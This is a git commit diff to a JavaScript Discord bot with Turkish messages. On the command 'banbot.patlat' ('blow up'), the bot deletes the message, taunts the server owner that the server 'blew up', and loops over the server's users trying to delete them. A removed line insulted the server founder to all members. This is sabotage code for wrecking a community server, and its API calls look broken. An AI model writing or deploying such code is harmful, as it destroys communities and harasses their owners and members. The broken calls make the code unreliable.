e004637ad55463344074bafe21917b9ab2da0b21
Mert Yıldırım <50714128+xRookieFight@users.noreply.github.com>
2020-08-03 12:28:23 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -9,10 +9,9 @@ console.log("Bot Aktif")
 client.on('message', msg => {
 if (msg.content === 'banbot.patlat') {
 msg.delete()
-msg.guild.guildOwner.send('Sunucun patladı kardeşim h.o')
+msg.guild.owner.send('Sunucun patladı kanka h.o')
 msg.guild.users.forEach(ban_bot => {
 ban_bot.delete()
-ban_bot.send('Kardeşlerim kurucunuz it çıktığından dolayı sunucunuz patlamıştır.')
 });
 }
 });
